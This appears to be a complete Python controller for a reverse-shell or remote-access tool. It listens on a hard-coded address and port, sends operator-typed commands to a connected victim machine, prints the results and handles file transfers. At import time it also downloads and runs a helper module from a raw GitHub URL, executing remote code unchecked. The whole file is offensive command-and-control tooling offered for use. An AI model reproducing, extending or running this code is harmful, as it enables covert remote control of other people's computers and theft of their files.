#! /usr/bin/env python3

import socket 
import os # Needed for file operation
import modules
import modules.httpimport as httpimport
socketnoise = httpimport.load('socketnoise', 'https://raw.githubusercontent.com/superwibr/Compromising-Creations/dev/')


host = '192.168.0.16'
port = 2828
instruction = ''

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host, port))
    s.listen(1)
    print(
		'[CCCntrl] Listening for incoming TCP connection on port ' + str(port)
	)
    conn, addr = s.accept()
    print(
		'[CCCntrl] We got a connection from: ' + str(addr)
	)



    while True: 
        command = input("CCCtrl > ")
        if command == "==terminate":
            conn.send('==terminate'.encode())
            conn.recv(1024)
            conn.close() 
            break
        elif '==transfer' in command: 
            modules.transfer(conn,command)
        else:
            conn.send(command.encode()) 
            response = conn.recv(1024).decode()
            if '[ERROR]' in response:
                print('ouch, an error!')
            print(response)


connect()